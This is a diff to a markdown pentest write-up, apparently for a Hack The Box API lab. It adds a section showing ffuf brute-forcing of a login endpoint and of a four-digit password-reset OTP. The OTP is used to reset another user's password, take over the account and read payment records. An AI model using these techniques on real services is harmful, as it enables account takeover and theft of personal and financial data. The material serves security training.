@@ -9,7 +9,7 @@ This document outlines common techniques for identifying and exploiting **API re
 - [API Attacks](#api-attacks)
   - [Overview](#overview)
   - [Broken Object Level Authorization (BOLA)](#broken-object-level-authorization-bola)
-
+  - [Broken Authentication](#broken-authentication)
 
 ---
 
@@ -159,7 +159,7 @@ for ((i=1; i<= 20; i++)); do
     curl -s -w "\n" -X 'GET' \
     "http://83.136.249.164:34382/api/v1/suppliers/quarterly-reports/$i" \
     -H 'accept: application/json' \
-    -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2Nzk3Njk1OSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.YPtcMyEp9HscjlfjpFxMH01SVAcTXWmeySXl1n7hAvQGXdCCwQUqudSfwhxcjcC5KyQqDsU3menKCdRsc-IdzQ' | jq >> reports.txt
+    -H 'Authorization: Bearer <JWT>' | jq >> reports.txt
 done
 ```
 
@@ -180,5 +180,316 @@ HTB{e76651e1f516eb5d7260621c26754776}
 ![Filtered output](images/bola9.PNG)
 
 This vulnerability allows **authenticated users to access sensitive financial and operational data belonging to other suppliers** by simply modifying a numeric identifier. The lack of object-level authorization checks enables large-scale data exposure and demonstrates a critical API security flaw.
+
+For a more in depth explanation of IDOR vulnerabilities, check out the `web-attacks` directory in this same Github repository. 
+
+---
+
+## Broken Authentication
+
+An API suffers from **Broken Authentication** when weaknesses in its authentication mechanisms allow attackers to bypass identity verification or compromise user accounts.
+
+The target application is vulnerable to [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html). A brief description of this weakness is shown below:
+
+```
+The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame.
+```
+
+The following valid credentials are provided:
+
+```
+htbpentester3@hackthebox.com:HTBPentester3
+```
+
+Authentication is performed through the following endpoint, which issues a **JSON Web Token (JWT)** upon successful login:
+
+```
+/api/v1/authentication/customers/sign-in
+```
+
+The authentication request is sent as JSON:
+
+```json
+{
+  "Email": "htbpentester3@pentestercompany.com",
+  "Password": "HTBPentester3"
+}
+```
+
+![Filtered output](images/broken-auth.PNG)
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjNAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJzX1VwZGF0ZUJ5Q3VycmVudFVzZXIiLCJDdXN0b21lcnNfR2V0IiwiQ3VzdG9tZXJzX0dldEFsbCJdLCJleHAiOjE3Njc5ODY0OTYsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.U6R1F97VFAehHfLRXuDO4VBIav_h-3CEMeEAmWRiVMTMuJgRkDe6LPMGgZaWQH2_tPGy2KuPM-pZ5Ki9IR4DHw"
+}
+```
+
+![Filtered output](images/broken-auth2.PNG)
+
+The JWT is supplied to the API using the `Authorize` feature in the Swagger interface:
+
+![Filtered output](images/broken-auth3.PNG)
+
+Authorization succeeds after providing the token:
+
+![Filtered output](images/broken-auth4.PNG)
+
+Querying the `/api/v1/roles/current-user` endpoint reveals that the authenticated user is assigned the following roles:
+
+- `Customers_UpdateByCurrentUser`
+- `Customers_Get`
+- `Customers_GetAll`
+
+![Filtered output](images/broken-auth5.PNG)
+
+The `Customers_GetAll` role permits access to the `/api/v1/customers` endpoint, which returns records for all customers:
+
+```
+http://83.136.248.107:32741/api/v1/customers
+```
+
+![Filtered output](images/broken-auth6.PNG)
+
+This endpoint exposes sensitive information such as email addresses, phone numbers, and birth dates. While this constitutes an authorization issue, it does not directly allow account takeover.
+
+Inspection of the `/api/v1/customers/current-user` **PATCH** endpoint shows that it allows authenticated users to update their profile details, including their password:
+
+```json
+{
+  "UpdatedCustomer": {
+    "Name": "string",
+    "Email": "user@example.com",
+    "PhoneNumber": "648561703358742276159723599389",
+    "BirthDate": "1992-01-09",
+    "Password": "string"
+  }
+}
+```
+
+![Filtered output](images/broken-auth7.PNG)
+
+When attempting to set a weak password such as `passw`, the API rejects the request, indicating a minimum password length requirement:
+
+```json
+{
+  "UpdatedCustomer": {
+    "Name": "string",
+    "Email": "user@example.com",
+    "PhoneNumber": "648561703358742276159723599389",
+    "BirthDate": "1992-01-09",
+    "Password": "passw"
+  }
+}
+```
+
+Response:
+
+```json
+{
+  "StatusCode": 400,
+  "Message": "One or more errors occurred!",
+  "Errors": {
+    "UpdatedCustomer.Password": [
+      "Password must be at least 6 characters long"
+    ]
+  }
+}
+```
+
+This response discloses password policy details, revealing that the API enforces only a minimal length requirement.
+
+When the password is set to a weak but valid value such as `123456`, the update succeeds:
+
+```json
+{
+  "UpdatedCustomer": {
+    "Name": "string",
+    "Email": "user@example.com",
+    "PhoneNumber": "648561703358742276159723599389",
+    "BirthDate": "1992-01-09",
+    "Password": "123456"
+  }
+}
+```
+
+![Filtered output](images/broken-auth9.PNG)
+
+Response:
+
+```json
+{
+  "successStatus": true
+}
+```
+
+![Filtered output](images/broken-auth10.PNG)
+
+This confirms the presence of a **weak password policy**, making brute-force and credential abuse viable.
+
+To prepare for brute-force testing, an invalid login attempt is made to observe the error message returned by the authentication endpoint:
+
+```json
+{
+  "Email": "htbpentester3@hackthebox.com",
+  "Password": "invalidPassword"
+}
+```
+
+Response:
+
+```json
+{
+  "errorMessage": "Invalid Credentials"
+}
+```
+
+A custom wordlist containing passwords of at least six characters is generated from the `xato-net-10-million-passwords-100000.txt` list:
+
+```bash
+grep -E '^.{6,}$' xato-net-10-million-passwords-100000.txt > xato_6plus.txt
+```
+
+Brute-force attempts are performed using `ffuf`, filtering out invalid responses:
+
+```bash
+ffuf -w xato_6plus.txt:FUZZ -request req.txt -request-proto http -fr "Invalid Credentials"
+```
+
+No valid credentials are discovered, suggesting that the target account uses a password with sufficient entropy.
+
+Since direct authentication brute-forcing fails, the password reset functionality is evaluated.
+
+An OTP reset request is initiated by supplying the victim’s email address:
+
+```
+/api/v1/authentication/customers/passwords/resets/sms-otps
+```
+
+The response indicates success:
+
+```json
+{
+  "SuccessStatus": true
+}
+```
+
+![Filtered output](images/broken-auth12.PNG)
+
+The password reset confirmation endpoint requires an OTP value:
+
+```
+/api/v1/authentication/customers/passwords/resets
+```
+
+Although the OTP is sent to the victim, the API does not enforce rate limiting or lockout mechanisms. Since OTP values are typically numeric and short, a brute-force attack is feasible.
+
+A four-digit OTP wordlist is generated:
+
+```bash
+seq -w 0 9999 > otp.txt
+```
+
+An invalid OTP attempt returns the following response:
+
+```json
+{
+  "SuccessStatus": false
+}
+```
+
+This response is used as a filter condition during brute-force attempts:
+
+```bash
+ffuf -w otp.txt:FUZZ -request req.txt -request-proto http -fr "false"
+```
+
+A valid OTP is successfully identified:
+
+```
+6307
+```
+
+![Filtered output](images/broken-auth11.PNG)
+
+Using the valid OTP, the victim’s password is reset to `123456`:
+
+```json
+{
+  "Email": "MasonJenkins@ymail.com",
+  "OTP": "6307",
+  "NewPassword": "123456"
+}
+```
+
+![Filtered output](images/broken-auth13.PNG)
+
+The new credentials are then used to authenticate successfully:
+
+```json
+{
+  "Email": "MasonJenkins@ymail.com",
+  "Password": "123456"
+}
+```
+
+Response:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3Njc5OTU1NjEsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.1A_G7v1DvXzGanotgvxoYVPOwegnXHVFMfNAhSN5aoxBwmgU6yp1gnlDMjOsb43i_amRLQkXUpg9byugTe0V0A"
+}
+```
+
+After supplying the JWT via the `Authorize` interface, querying `/api/v1/customers/current-user` confirms successful account takeover:
+
+![Filtered output](images/broken-auth14.PNG)
+
+
+```json
+{
+  "customer": {
+    "id": "53428a83-8591-4548-a553-c434ad76a61a",
+    "name": "Mason Jenkins",
+    "email": "MasonJenkins@ymail.com",
+    "phoneNumber": "+44 7451 162707",
+    "birthDate": "1985-09-16"
+  }
+}
+```
+
+![Filtered output](images/broken-auth15.PNG)
+
+With full access to the compromised account, sensitive financial data can be accessed via the following endpoint:
+
+```
+/api/v1/customers/payment-options/current-user
+```
+
+Response:
+
+```json
+{
+  "customerPaymentOptions": [
+    {
+      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
+      "type": "Debit Card",
+      "provider": "Capital One",
+      "accountNumber": "9754729874181436",
+      "cvvHash": "B6EDC1CD1F36E45DAF6D7824D7BB2283"
+    },
+    {
+      "customerID": "53428a83-8591-4548-a553-c434ad76a61a",
+      "type": "Credit Card",
+      "provider": "HTB Academy",
+      "accountNumber": "HTB{115a6329120e9eff13c4ec6a63343ed1}",
+      "cvvHash": "5EF0B4EBA35AB2D6180B0BCA7E46B6F9"
+    }
+  ]
+}
+```
+
+This vulnerability chain demonstrates how weak password policies, missing rate limiting, and brute-forceable OTP mechanisms can be combined to achieve full account takeover. An attacker can reset arbitrary user passwords and gain unauthorized access to sensitive personal and financial data.
 
 ---
